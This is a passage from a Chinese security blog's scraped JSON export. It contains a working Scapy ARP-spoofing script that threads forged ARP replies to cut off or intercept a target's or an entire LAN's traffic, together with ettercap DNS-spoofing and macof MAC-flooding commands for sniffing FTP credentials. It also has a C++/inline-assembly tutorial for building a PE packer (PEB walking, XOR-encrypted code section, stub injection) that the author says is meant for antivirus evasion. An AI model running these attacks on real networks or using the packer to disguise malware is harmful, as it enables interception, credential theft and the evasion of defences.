&#x2F;&#x2F;发第二层包并返等待回应，返回值的第一个参数是回应包体。第二个参数是未回应包体sendp(Ether(src&#x3D;a,dst&#x3D;b)&#x2F;ARP(hwsrc&#x3D;c,psrc&#x3D;d,pdst&#x3D;e,op&#x3D;f))&#x2F;&#x2F;这是arp发包的构造 sendp是发第二层数据包并不等待回包 Ether是构造包体的意思&#x2F;&#x2F;a为自己的mac地址 b为目标机器的mac地址，&#x2F;&#x2F;c为发包的来源mac，d为发包的来源ip，e是目标机器的ip，f是arp操作类型字符&#x2F;&#x2F;arp欺骗的话，把d改成网关IP即可 网上嫖的ip，mac扫描模块，这一步也可以手动获取 from scapy.all import *#im_scan(&#39;192.168.1.1&#x2F;24&#39;),mac ip地址扫描函数def im_scan(ipduan): ipscan&#x3D;ipduan try: ans,unans &#x3D; srp(Ether(dst&#x3D;&quot;FF:FF:FF:FF:FF:FF&quot;)&#x2F;ARP(pdst&#x3D;ipscan),timeout&#x3D;2,verbose&#x3D;False) except Exception as e: print (str(e)) else: for snd,rcv in ans: list_mac&#x3D;rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;) print (list_mac) 这个脚本仅能断网嗷,可以对单个机器断网，也可以断整个局域网的网 from scapy.all import *import timeimport threadingdef im_scan(ipduan):#扫描 ipscan&#x3D;ipduan try: ans,unans &#x3D; srp(Ether(dst&#x3D;&quot;FF:FF:FF:FF:FF:FF&quot;)&#x2F;ARP(pdst&#x3D;ipscan),timeout&#x3D;2,verbose&#x3D;False) except Exception as e: print (str(e)) else: for snd,rcv in ans: list_mac&#x3D;rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;) print (list_mac) def arp_spoof(tgt_ip,gateway_ip,iface): mmac&#x3D;get_if_hwaddr(iface) tgt_mac&#x3D;getmacbyip(tgt_ip) if tgt_ip: while 1: sendp(Ether(src&#x3D;mmac,dst&#x3D;&#39;ff:ff:ff:ff:ff:ff&#39;)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;gateway_ip,pdst&#x3D;tgt_ip,op&#x3D;2)) else: while 1: sendp(Ether(src&#x3D;mmac,dst&#x3D;&#39;ff:ff:ff:ff:ff:ff&#39;)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;gateway_ip,op&#x3D;2))def arp_gate(tgt_ip,gateway_ip,iface): mmac&#x3D;get_if_hwaddr(iface) tgt_mac&#x3D;getmacbyip(tgt_ip) while 1: sendp(Ether(dst&#x3D;gateway_mac,src&#x3D;mmac)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;tgt_ip,pdst&#x3D;gateway_ip,op&#x3D;2))if __name__&#x3D;&#x3D;&#39;__main__&#39;: ipduan&#x3D;&#39;192.168.0.0&#x2F;24&#39; tgt_ip&#x3D;&#39;192.168.0.104&#39; #要打整个局域网就别设置这个，要截获外界发往机器的数据这个也必须设置 gateway_ip&#x3D;&#39;192.168.0.1&#39; iface&#x3D;&#39;WLAN&#39; threads_num&#x3D;20 print(&quot;如果想搞整个局域网就别设置tgt_ip,要截获外界发往机器的数据这个必须设置&quot;) so_scan&#x3D;input(&quot;[+]要扫描局域网存活主机和它的mac吗[Y&#x2F;N]&quot;) if so_scan&#x3D;&#x3D;&#39;Y&#39;: im_scan(ipduan) else: so_judge&#x3D;input(&quot;[+]你是想让机器的发送的数据被你截获Y，还是外界发送给机器的数据被你截获N[Y&#x2F;N]&quot;) if so_judge&#x3D;&#x3D;&#39;Y&#39;: try: print(&#39;开始截胡机器发送往外界的数据&#39;) time.sleep(3) for i in range(threads_num): t1&#x3D;threading.Thread(target&#x3D;arp_spoof,args&#x3D;(tgt_ip,gateway_ip,iface),name&#x3D;str(i)) t1.start() except KeyboardInterrupt: print(&#39;[+]stopppppppp&#39;) else: if tgt_ip: try: print(&#39;开始截胡外界发往机器的数据&#39;) time.sleep(3) for i in range(threads_num): t2&#x3D;threading.Thread(target&#x3D;arp_gate,args&#x3D;(tgt_ip,gateway_ip,iface),name&#x3D;str(i)) t2.start() except KeyboardInterrupt: print(&#39;[+]stopppppppp&#39;) else: print(&#39;请设置tgt_ip&#39;) 广播欺骗，受害机上的抓包效果 3c那个是我的mac地址 DNS欺骗dns工作原理dns（域名系统）将域名和IP地址相互映射，dns协议即域名解析协议，用来将用户输入的域名解析为IP。具体一点，当用户访问某个域名如www.baidu.com时， 首先向本地dns发出请求若本地dns缓存表无该域名IP映射关系，就会向根域名服务器发起查询，根域名服务器返回com域服务器地址给本地dns服务器本地dns服务器向com域服务器发起查询，com域服务器返回baidu.com域服务器给本地dns服务器本地dns服务器向baidu.com域服务器发起查询，baidu.com域服务器返回www.baidu.com地址 DNS欺骗原理在arp欺骗后获取到了受害机发起的dns请求包，然后返回一个自己构造的dns响应包，伪造自己想要的ip域名映射关系。因为DNS欺骗是建立在arp欺骗基础上，arp欺骗又必须在局域网进行，故DNS欺骗也只能在局域网进行 DNS欺骗工具实现 ettercap -T -q -P dns_spoof -M arp:remote &#x2F;受害者IP&#x2F;&#x2F;&#x2F; mac泛洪攻击交换机:交换机，只能做有线链接，所以拿这个是不能用作wifi的。交换机的作用是转发局域网内两台机器之间的互相的请求（有线连接的机器）。 交换机具体传输数据帧的过程： 假设主机A第一次向主机B发送数据主机A向交换机发起一个源mac地址为自己，目标mac地址为主机B的数据帧交换机收到后，将源mac地址和其对应接口记录到mac地址表中（mac地址表与arp缓存表有区别）交换机在自己的mac地址表中检查是否有目标mac的信息，如果有则向目标mac接口转发数据帧，如果没有，就会向所以非数据来源接口的接口广播该数据帧（mac泛洪攻击原理）局域网内主机都收到了此数据帧，但只有主机B会响应该数据帧并且回应，回应信息里注明主机B的mac地址以便记录到mac地址表，其他主机都不会有反应。交换机接收到主机B的回应后，会记录其mac 接口的映射关系，以后AB通信时会调用mac地址表中的记录，实现单播 mac表与arp缓存表的区别mac表记录在交换机中，用于记录接口 mac地址的对应关系arp缓存表记录在本机中，用于记录IP mac地址的对应关系 交换机mac表的学习机制：mac表一般都是有大小限制的，一旦mac表满了，其他mac地址就加不进来了。一旦其他mac地址加不进来了，那么mac表就无法进一步学习，之后的所有请求都会被广播到局域网，实现泛洪。mac表是有老化机制的，若交换机与某台主机长时间未通信，交换机就会把该主机的mac地址删除，等下一次通信时再学习。 泛洪攻击原理：泛洪攻击的目的是获取主机之间的通信数据，要达到这个目的则需要强迫交换机把接收到的数据帧统统广播出来。泛洪攻击原理则是向交换机发送大量未知mac地址让交换机不停学习，把mac表充满，这样正常主机mac地址老化后就无法再添加到mac地址表中，以后的所有通信数据都会被广播出来 使用kali上的macof来进行泛洪攻击目前有三台机器我们试着截获物理机登录ftp服务器时的账户与密码先使用命令macof，让交换机的mac表被占满仅输入macof即可输入tcpdump -nn -X -i eth0 tcp port 21开始抓包（建议不用wireshark，是因为同一时间macof命令发出的数据包太多了，用wireshark会巨卡） 下面是抓http包 mac泛洪攻击的局限性:只能在局域网内攻击另一个局域网内机器.且攻击目标必须和自己用交换机有线连接起来也就是说你的电脑发起mac泛洪是攻击不到你的手机的。","categories":[],"tags":[{"name":"内网渗透与权限维持","slug":"内网渗透与权限维持","permalink":"http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"从0开始用C++写一个加壳器","slug":"从0开始用C++写一个加壳器","date":"2021-06-28T13:51:48.301Z","updated":"2021-06-28T13:40:02.966Z","comments":true,"path":"2021/06/28/从0开始用C++写一个加壳器/","link":"","permalink":"http://const27.com/2021/06/28/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C++%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/","excerpt":"","text":"参考:https://blog.csdn.net/qq_31507523/article/details/89438410 学习一下写壳，在以后免杀中使用。 加壳原理手工加壳用010editor手工加壳了解一波原理。加壳原理大致如下 即我们向PE文件添加一个区段并将其设置为入口点，这样PE文件最开始执行的命令就是我们添加的区段也就是壳的指令，壳对加密区进行解密，对压缩区进行解压，将原本的EXE文件还原出来，然后跳转至原程序入口，程序照常运行。 首先生成一个打印hello的exe文件。 #include &lt;stdio.h&gt;int main() &#123; printf(&quot;hello&quot;);&#125; 我们目前要干的事情是:以手动的形式向PE文件添加一个壳部分并设为程序入口，并使其能跳转回原入口。那就来吧 用010editor打开我们的exe文件，启用exe模板分析。我们首先修改其文件头numverofsection属性，这个属性用来定义当前PE文件存在多少个区段,因为我们要添加一个壳区段，所以我们将其加1变成6 在我们重载模板后我们就会在区段表发现多出来一个空的区段表 从上到下各个比较重要字段的意思是\\1. Name 表示该区段的名字2.VirtualSize 表示在内存中的大小(一般内存对齐为0x1000)3.virtualaddress 虚拟地址 即上一个区段的VirtualAddress + 上一个区段经内存对齐粒度对齐后的大小4.sizeofdata 表示在文件中的大小（一般文件对齐为0x200)5.pointertorawdata 文件的偏移 即 上一个区段的PointerToRawData + 上一个区段的SizeOfRawData 然后我们通过修改以上各值来定义一个新区段（壳区段)的属性 这里的virtualsize看着填一个就行了。此时我们只是定义了区段表，但文件中并没有该区段存在，所以我们得创建该区段。然后还要让区段可编辑，把下列值改为1即可 ctrl+shift+i 向目标文件偏移处插入0x200大小的空间。这样一来，壳区段就创建好了。 然后我们还要修改 扩展头的SizeofImage 。将他改为最后一个区段的内存地址+内存大小 然后去掉随机基址选项。 找到扩展头的DLL属性字段，去掉随机基址，把40 81改为 00 81 接下来我们把程序入口点设置给壳区段。使用LORDPE把入口点设为壳区块的虚拟地址 然后我们用OD打开这个文件 真正的加壳流程刚刚提到的手工加壳，不过是最最基础的加壳原型而已，真正的加壳还涉及了代码加解密等操作. 真正写壳时一般写两个东西，加壳器和stub所谓加壳器，就是给被加壳文件创造出一个新的区段， 在此同时将程序以某种方式加密，然后把stub放入新区段，并将程序入口点设为新区段的地址，然后在新区段结束后跳转回原程序入口。这个新区段我们叫做壳区段.那么这个stub就是加壳后程序最先执行的命令了，它执行解密算法，将原程序释放出来。 基于c++的壳编写实现了一个薛定谔的加壳器（雾）加壳好的程序有一定几率运行不了，原因未知。。 https://github.com/ConsT27/PackingEXE/tree/master 👈项目地址 很大一部分上是借鉴这个老哥的https://github.com/TonyChen56/GuiShou_Pack 第一次接触汇编编程，c++编程，上来就是搞这么一个项目，搞了快两个星期，确实有点痛苦，到现在还有很大部分不是很懂的地方（比如许多数据类型以及底层汇编（笑😁这个项目也存在bug，也就是刚刚说的程序有几率不能运行的问题。😡但是也学到了挺多，比如PEB动态寻址，PE文件结构等等。😁苦于网上没有一篇文章详细的交代了技术的细节，所以这篇文章会尽可能的详细。接下来是各个流程的详细实现方法，至于怎么把各个流程链接起来，师傅们可以通过下载上面提到的两个项目来看一下。 Stubstub是被植入到PE文件中的代码，它一般会干下面这些事情。 流程如下 0.合并data，rdata到text1.PEB动态寻址，遍历导出表找到GetProcAddress函数2.解密3.修改入口点到原入口点 同时stub一般以dll的形式存在。原因是DLL通常自带重定位表，这在我们的移植过程中的重定位操作中提供了巨大的便利。 合并数据段我们要移植stub过去，肯定需要移植代码段，也需要移植数据段。不如我们干脆把数据段合并到代码段，一块移植过去。 PEB动态寻址&amp;导出表遍历找函数为什么会用到这个技术编写stub？因为我们的stub.dll植入到宿主程序时，只有.text植入过去，没有对应的导入表，所以我们的stub无法直接调用一些API。所以我们需要动态获取各种API。其中我采用的是PEB动态查询得到GetProcAddress函数，然后用GetProcAddress函数去获取各个API。 那么，什么是PEB？PEB是一个微软还未完全公开作用的一个结构，它叫做 进程环境信息块 ，包含了进程的信息。其结构如下 typedef struct _PEB &#123; BYTE Reserved1[2]; BYTE BeingDebugged; &#x2F;&#x2F;被调试状态 BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; BYTE Reserved4[104]; PVOID Reserved5[52]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved6[128]; PVOID Reserved7[1]; ULONG SessionId;&#125; PEB, *PPEB;复制代码 我们关心的是PEB偏移0c得到的 PPEB_LDR_DATA Ldr; 它是一个指针，指向一个 PPEB_LDR_DATA 结构， 存放着已经被进程装在的动态链接库的信息 typedef struct _PEB_LDR_DATA&#123; ULONG Length; &#x2F;&#x2F; +0x00 BOOLEAN Initialized; &#x2F;&#x2F; +0x04 PVOID SsHandle; &#x2F;&#x2F; +0x08 LIST_ENTRY InLoadOrderModuleList; &#x2F;&#x2F; +0x0c LIST_ENTRY InMemoryOrderModuleList; &#x2F;&#x2F; +0x14 LIST_ENTRY InInitializationOrderModuleList;&#x2F;&#x2F; +0x1c&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; &#x2F;&#x2F; +0x24 PPEB_LDR_DATA 偏移1c是一个指向LIST_ENTRY InInitializationOrderModuleList结构的指针，这个结构 存放着指向模块初始化链表的头 ， 按顺序存放着PE装入运行时初始化模块信息，一般来说第一个链表结点是ntdll.dll,第二个链表结点就是kernel32.dll 。我们就在其中找到kernel32.dll的信息，获取其PE信息，得到导出表，循环遍历得到GetProcAddress函数。另外，PEB地址再TEB偏移0x30处。用汇编语言表示就是 fs:[0x30]。 以上是PEB寻址的大致流程，另外还有一个比较关键的点是遍历kernel32.dll导出表获得GetProcAddress函数信息。关于导出表可以看看这个文章https://blog.csdn.net/evileagle/article/details/12176797 首先一个导出表结构体如下 typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; &#x2F;&#x2F;一般为0，没啥用 DWORD TimeDateStamp; &#x2F;&#x2F;导出表生成的时间 WORD MajorVersion; &#x2F;&#x2F;版本，也是0没啥用 WORD MinorVersion; &#x2F;&#x2F;也是没啥用的版本信息一般为0 DWORD Name; &#x2F;&#x2F;当前导出表的模块名字 DWORD Base; &#x2F;&#x2F;序号表中序号的基数 DWORD NumberOfFunctions; &#x2F;&#x2F;导出函数数量 DWORD NumberOfNames; &#x2F;&#x2F;按名字导出函数的数量 DWORD AddressOfFunctions; &#x2F;&#x2F; 序号表 DWORD AddressOfNames; &#x2F;&#x2F; 名称表 DWORD AddressOfNameOrdinals; &#x2F;&#x2F; 地址表&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 其中序号表的起始序号是Base属性定义的值。以下是导出表的序号名称地址表的关系 我们的遍历流程是，先遍历名称表找到GetProcAddress在名称数组中的下标，然后根据这个下标去序号数组中找相同下标的序号值，然后以这个序号值为下标去找地址数组中的对应值。我们找到的地址表中的值就是函数入口 下面我把这段程序的汇编代码放出来。我是用内联汇编把这段代码塞进C++的 void GetApis()&#123; HMODULE hKernel32; _asm &#123; pushad; ; &#x2F;&#x2F;获取kernel32.dll的加载基址; mov eax, fs: [0x30] ; &#x2F;&#x2F;得到PEB地址 mov eax, [eax + 0ch]; &#x2F;&#x2F;获得LDR_PEB_DATA地址 mov eax, [eax + 0ch]; &#x2F;&#x2F;获得LIST_ENTRY InLoadOrderModuleList;地址 mov eax, [eax]; &#x2F;&#x2F;获得LIST_ENTRY InLoadOrderModuleList下一项的地址 mov eax, [eax]; &#x2F;获得LIST_ENTRY InLoadOrderModuleList下下项即我们需要的LIST_ENTRY InInitializationOrderModuleList的地址 mov eax, [eax + 018h]; &#x2F;&#x2F;获得kernel32.dll地址 mov hKernel32, eax; mov ebx, [eax + 03ch];&#x2F;&#x2F;获得kernel32.dll NT头RVA add ebx, eax; &#x2F;&#x2F;NT头的VA add ebx, 078h; &#x2F;&#x2F;获得区段表 mov ebx, [ebx]; &#x2F;&#x2F;获得导出表RVA add ebx, eax; &#x2F;&#x2F;导出表VA lea ecx, [ebx + 020h]; mov ecx, [ecx]; &#x2F;&#x2F; ecx &#x3D;&gt; 名称表的首地址(rva); add ecx, eax; &#x2F;&#x2F; ecx &#x3D;&gt; 名称表的首地址(va); xor edx, edx; &#x2F;&#x2F; 作为索引(index)来使用. _WHILE:; mov esi, [ecx + edx * 4];&#x2F;&#x2F;名称数组入口点rva，名称数组单位大小4字节 lea esi, [esi + eax]; &#x2F;&#x2F;入口点VA cmp dword ptr[esi], 050746547h; &#x2F;&#x2F;进行名称匹配，050746547h即小端存储的GetP jne _LOOP;&#x2F;&#x2F;不相等就跳入_LOOP段 cmp dword ptr[esi + 4], 041636f72h; &#x2F;&#x2F;名陈匹配，rocA，以下依次为ddre，ss jne _LOOP; cmp dword ptr[esi + 8], 065726464h; jne _LOOP; cmp word ptr[esi + 0ch], 07373h; jne _LOOP; mov edi, [ebx + 024h]; add edi, eax; &#x2F;&#x2F;获得序号表VA mov di, [edi + edx * 2]; &#x2F;&#x2F;获得序号数组中对应下标的地址，序号数组单位大小2字节 and edi, 0FFFFh; &#x2F;&#x2F;给di提位到32位，即给予edi 序号表中对应下标的地址 mov edx, [ebx + 01ch]; add edx, eax; &#x2F;&#x2F;获得地址表 mov edi, [edx + edi * 4]; &#x2F;&#x2F;获得地址数组中，序号对应的值，地址数组单位大小4字节 add edi, eax; &#x2F;&#x2F;获得GetProcAddress的入口地址 mov MyGetProcAddress, edi; &#x2F;&#x2F;赋值 jmp _ENDWHILE; &#x2F;&#x2F;END _LOOP:; inc edx; &#x2F;&#x2F; ++index; jmp _WHILE; _ENDWHILE:; popad; &#125; 解密解密代码段。这段好写。 void Decrypt()&#123; unsigned char* pText &#x3D; (unsigned char*)g_conf.textScnRVA + 0x400000;&#x2F;&#x2F;锁定到PE文件的text段（因为加壳时去掉了基址随机化，所以自信的把基址填成0x400000 DWORD old &#x3D; 0; MyVirtualProtect(pText, g_conf.textScnSize, PAGE_READWRITE, &amp;old);&#x2F;&#x2F;修改代码段的属性,注意我们这里使用了动态获得的 &#x2F;&#x2F;解密代码段 for (DWORD i &#x3D; 0; i &lt; g_conf.textScnSize; i++) &#123; pText[i] ^&#x3D; g_conf.key; &#125; &#x2F;&#x2F;把属性修改回去 MyVirtualProtect(pText, g_conf.textScnSize, old, &amp;old);&#125; 修改入口点_asm &#123; mov eax, g_conf.srcOep; &#x2F;&#x2F;入口点是g_conf.srcOep add eax, 0x400000 jmp eax &#125; 加壳器加壳器流程如下 1.打开需要被加壳的PE文件2.加载stub3.加密代码段4.添加新区段5.stub重定位修复6.stub移植7.PE文件入口点修改8.去随机基址9.保存文件 以下的各个流程描述中会用到诸多自定义函数，我先贴上来吧。 诸多自定函数&amp;结构体&#x2F;&#x2F;****************&#x2F;&#x2F;对齐处理&#x2F;&#x2F;time:2020&#x2F;11&#x2F;5&#x2F;&#x2F;****************int AlignMent(_In_ int size, _In_ int alignment) &#123; return (size) % (alignment)&#x3D;&#x3D;0 ? (size) : ((size) &#x2F; alignment+1) * (alignment);&#125;&#x2F;&#x2F;***********************&#x2F;&#x2F;PE信息获取函数簇&#x2F;&#x2F;time:2020&#x2F;11&#x2F;2&#x2F;&#x2F;***********************PIMAGE_DOS_HEADER GetDosHeader(_In_ char* pBase) &#123; return PIMAGE_DOS_HEADER(pBase);&#125;PIMAGE_NT_HEADERS GetNtHeader(_In_ char* pBase) &#123;return PIMAGE_NT_HEADERS(GetDosHeader(pBase)-&gt;e_lfanew+(SIZE_T)pBase);&#125;PIMAGE_FILE_HEADER GetFileHeader(_In_ char* pBase) &#123; return &amp;(GetNtHeader(pBase)-&gt;FileHeader);&#125;PIMAGE_OPTIONAL_HEADER32 GetOptHeader(_In_ char* pBase) &#123; return &amp;(GetNtHeader(pBase)-&gt;OptionalHeader);&#125;PIMAGE_SECTION_HEADER GetLastSec(_In_ char* pBase) &#123; DWORD SecNum &#x3D; GetFileHeader(pBase)-&gt;NumberOfSections; PIMAGE_SECTION_HEADER FirstSec &#x3D; IMAGE_FIRST_SECTION(GetNtHeader(pBase)); PIMAGE_SECTION_HEADER LastSec &#x3D; FirstSec + SecNum - 1; return LastSec;&#125;PIMAGE_SECTION_HEADER GetSecByName(_In_ char* pBase,_In_ const char* name) &#123; DWORD Secnum &#x3D; GetFileHeader(pBase)-&gt;NumberOfSections; PIMAGE_SECTION_HEADER Section &#x3D; IMAGE_FIRST_SECTION(GetNtHeader(pBase)); char buf[10] &#x3D; &#123; 0 &#125;; for (DWORD i &#x3D; 0; i &lt; Secnum; i++) &#123; memcpy_s(buf, 8, (char*)Section[i].Name, 8); if (!strcmp(buf, name)) &#123; return Section + i; &#125; &#125; return nullptr;&#125;typedef struct _StubConf&#123; DWORD srcOep; &#x2F;&#x2F;入口点 DWORD textScnRVA; &#x2F;&#x2F;代码段RVA DWORD textScnSize; &#x2F;&#x2F;代码段的大小 DWORD key; &#x2F;&#x2F;解密密钥&#125;StubConf;struct StubInfo&#123; char* dllbase; &#x2F;&#x2F;stub.dll的加载基址 DWORD pfnStart; &#x2F;&#x2F;stub.dll(start)导出函数的地址 StubConf* pStubConf; &#x2F;&#x2F;stub.dll(g_conf)导出全局变量的地址&#125;; 打开PE文件这里采用的方法是利用CreateFileA函数。同时这个函数还抛出了一个指向PE文件大小的指针 char* GetFileHmoudle(_In_ const char* path,_Out_opt_ DWORD* nFileSize) &#123; &#x2F;&#x2F;打开一个文件并获得文件句柄 HANDLE hFile &#x3D; CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); &#x2F;&#x2F;获得文件大小 DWORD FileSize &#x3D; GetFileSize(hFile, NULL); &#x2F;&#x2F;返回文件大小到变量nFileSize if(nFileSize) *nFileSize &#x3D; FileSize; &#x2F;&#x2F;申请一片大小为FileSize的内存并将指针置于首位 char* pFileBuf &#x3D; new CHAR[FileSize]&#123; 0 &#125;; &#x2F;&#x2F;给刚刚申请的内存读入数据 DWORD dwRead; ReadFile(hFile, pFileBuf, FileSize, &amp;dwRead, NULL); CloseHandle(hFile); return pFileBuf;&#125; 加载STUBvoid LoadStub(_In_ StubInfo* pstub) &#123; pstub-&gt;dllbase &#x3D; (char*)LoadLibraryEx(L&quot;F:\\\\stubdll.dll&quot;, NULL, DONT_RESOLVE_DLL_REFERENCES); pstub-&gt;pfnStart &#x3D; (DWORD)GetProcAddress((HMODULE)pstub-&gt;dllbase, &quot;Start&quot;); &#x2F;&#x2F;获得stub的入口函数Start(自己定义在stub中的一个函数 pstub-&gt;pStubConf &#x3D; (StubConf*)GetProcAddress((HMODULE)pstub-&gt;dllbase, &quot;g_conf&quot;);&#125;&#x2F;&#x2F;不仅加载了stub，还获得了stub抛出的用于收集信息的全局结构体（g_conf,是一个stub抛出的结构体，用于获取信息，结构如下）typedef struct _StubConf&#123; DWORD srcOep; &#x2F;&#x2F;入口点 DWORD textScnRVA; &#x2F;&#x2F;代码段RVA DWORD textScnSize; &#x2F;&#x2F;代码段的大小 DWORD key; &#x2F;&#x2F;解密密钥&#125;StubConf; 加密代码段DWORD textRVA &#x3D; GetSecByName(PeHmoudle, &quot;.text&quot;)-&gt;VirtualAddress;DWORD textSize &#x3D; GetSecByName(PeHmoudle, &quot;.text&quot;)-&gt;Misc.VirtualSize;Encry(PeHmoudle,pstub);void Encry(_In_ char* hpe,_In_ StubInfo pstub) &#123; &#x2F;&#x2F;获取代码段首地址 BYTE* TargetText &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;PointerToRawData + (BYTE*)hpe; &#x2F;&#x2F;获取代码段大小 DWORD TargetTextSize &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;Misc.VirtualSize; &#x2F;&#x2F;加密代码段 for (int i &#x3D; 0; i &lt; TargetTextSize; i++) &#123; TargetText[i] ^&#x3D; 0x15; &#125; pstub.pStubConf-&gt;textScnRVA &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;VirtualAddress; pstub.pStubConf-&gt;textScnSize &#x3D; TargetTextSize; pstub.pStubConf-&gt;key &#x3D; 0x15;&#125;&#x2F;&#x2F;加密代码段，并给予了stub一些信息 添加新区段char* AddSec(_In_ char*&amp; hpe, _In_ DWORD&amp; filesize, _In_ const char* secname, _In_ const int secsize) &#123; GetFileHeader(hpe)-&gt;NumberOfSections++; PIMAGE_SECTION_HEADER pesec &#x3D; GetLastSec(hpe); &#x2F;&#x2F;设置区段表属性 memcpy(pesec-&gt;Name, secname, 8); pesec-&gt;Misc.VirtualSize &#x3D; secsize; pesec-&gt;VirtualAddress &#x3D; (pesec - 1)-&gt;VirtualAddress + AlignMent((pesec - 1)-&gt;SizeOfRawData,GetOptHeader(hpe)-&gt;SectionAlignment); pesec-&gt;SizeOfRawData &#x3D; AlignMent(secsize, GetOptHeader(hpe)-&gt;FileAlignment); pesec-&gt;PointerToRawData &#x3D; AlignMent(filesize,GetOptHeader(hpe)-&gt;FileAlignment); pesec-&gt;Characteristics &#x3D; 0xE00000E0; &#x2F;&#x2F;设置OPT头映像大小 GetOptHeader(hpe)-&gt;SizeOfImage &#x3D; pesec-&gt;VirtualAddress + pesec-&gt;SizeOfRawData; &#x2F;&#x2F;扩充文件数据 int newSize &#x3D; pesec-&gt;PointerToRawData + pesec-&gt;SizeOfRawData; char* nhpe &#x3D; new char [newSize] &#123;0&#125;; &#x2F;&#x2F;向新缓冲区录入数据 memcpy(nhpe, hpe, filesize); &#x2F;&#x2F;缓存区更替 delete hpe; filesize &#x3D; newSize; return nhpe;&#125; stub重定位好家伙，这个东西稍有不慎就会让整个程序拉跨掉（过来人的忠告为什么需要stub重定位呢？因为我们的stub最开始是加载在内存中的，它的许多指令如跳转到的地址是按内存为基准确定的，但是我们需要把他移植进文件，所以它的代码里许多地址就是错误的，我们需要对这些地址进行处理，即重定位，使其以宿主程序为标准进行地址修复。可能我表述的不是很清楚😥举个例子吧，比如stub在加载进内存时，有一条跳转指令时jmp 12345678, 如果我们不处理就把这条指令移植进PE文件，那么PE文件执行到此处时就会跳转到12345678，此时的12345678地址可能就已经不是PE文件加载的内存区间了，从而程序会崩溃。所以要修复。根据stub的重定位表进行修复。重定位表就是记录哪些地址的数据需要被修复的，我们遍历这些地址进行修复即可。如果以下代码看起来吃力，可以先去了解一下重定位表 void FixStub(DWORD targetDllbase, DWORD stubDllbase,DWORD targetNewScnRva,DWORD stubTextRva )&#123; &#x2F;&#x2F;找到stub.dll的重定位表 DWORD dwRelRva &#x3D; GetOptHeader((char*)stubDllbase)-&gt;DataDirectory[5].VirtualAddress; IMAGE_BASE_RELOCATION* pRel &#x3D; (IMAGE_BASE_RELOCATION*)(dwRelRva + stubDllbase); &#x2F;&#x2F;遍历重定位表 while (pRel-&gt;SizeOfBlock) &#123; struct TypeOffset &#123; WORD offset : 12; WORD type : 4; &#125;; TypeOffset* pTypeOffset &#x3D; (TypeOffset*)(pRel + 1); DWORD dwCount &#x3D; (pRel-&gt;SizeOfBlock - 8) &#x2F; 2; &#x2F;&#x2F;需要重定位的数量 for (int i &#x3D; 0; i &lt; dwCount; i++) &#123; if (pTypeOffset[i].type !&#x3D; 3) &#123; continue; &#125; &#x2F;&#x2F;需要重定位的地址 DWORD* pFixAddr &#x3D; (DWORD*)(pRel-&gt;VirtualAddress + pTypeOffset[i].offset + stubDllbase); DWORD dwOld; &#x2F;&#x2F;修改属性为可写 VirtualProtect(pFixAddr, 4, PAGE_READWRITE, &amp;dwOld); &#x2F;&#x2F;去掉dll当前加载基址 *pFixAddr -&#x3D; stubDllbase; &#x2F;&#x2F;去掉默认的段首RVA *pFixAddr -&#x3D; stubTextRva; &#x2F;&#x2F;换上目标文件的加载基址 *pFixAddr +&#x3D; targetDllbase; &#x2F;&#x2F;加上新区段的段首RVA *pFixAddr +&#x3D; targetNewScnRva; &#x2F;&#x2F;把属性修改回去 VirtualProtect(pFixAddr, 4, dwOld, &amp;dwOld); &#125; &#x2F;&#x2F;切换到下一个重定位块 pRel &#x3D; (IMAGE_BASE_RELOCATION*)((DWORD)pRel + pRel-&gt;SizeOfBlock); &#125; stub移植这个简单，没啥说的 memcpy(GetLastSec(PeNewHmoudle)-&gt;PointerToRawData+ PeNewHmoudle, GetSecByName(pstub.dllbase, &quot;.text&quot;)-&gt;VirtualAddress+pstub.dllbase, GetSecByName(pstub.dllbase,&quot;.text&quot;)-&gt;Misc.VirtualSize); 入口点修改GetOptHeader(PeNewHmoudle)-&gt;AddressOfEntryPoint &#x3D; pstub.pfnStart-(DWORD)pstub.dllbase-GetSecByName(pstub.dllbase,&quot;.text&quot;)-&gt;VirtualAddress+GetLastSec(PeNewHmoudle)-&gt;VirtualAddress; 去随机基址不去掉随机基址，加载基址就是不固定的，不方便操作 GetOptHeader(PeNewHmoudle)-&gt;DllCharacteristics &amp;&#x3D; (~0x40); 保存文件void SaveFile(_In_ const char* path, _In_ const char* data, _In_ int FileSize) &#123; HANDLE hFile &#x3D; CreateFileA( path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL ); DWORD Buf &#x3D; 0; WriteFile(hFile, data, FileSize, &amp;Buf,NULL); CloseHandle(hFile);&#125; 后记第一次搞底层的玩意儿，导致调试这东西花了我不少时间。。不过学的还是？蛮多的？动态调试，c++，汇编，PE结构，动态寻址都学到了些。（怎么感觉在往逆向走了2333继续弄吧，这个项目目前还有bug，等以后来了兴趣再继续添加更多更牛逼的机制。","categories":[],"tags":[{"name":"免杀","slug":"免杀","permalink":"http://const27.com/tags/%E5%85%8D%E6%9D%80/"}]},{"title":"DefenseEvasion免杀手法收集","slug":"Defense Evasion 收集","date":"2021-06-28T13:51:35.270Z","updated":"2021-06-28T13:39:48.985Z","comments":true,"path":"2021/06/28/Defense Evasion 收集/","link":"","permalink":"http://const27.com/2021/06/28/Defense%20Evasion%20%E6%94%B6%E9%9B%86/","excerpt":"","text":"前面的话:”免杀一般都是靠组合拳” 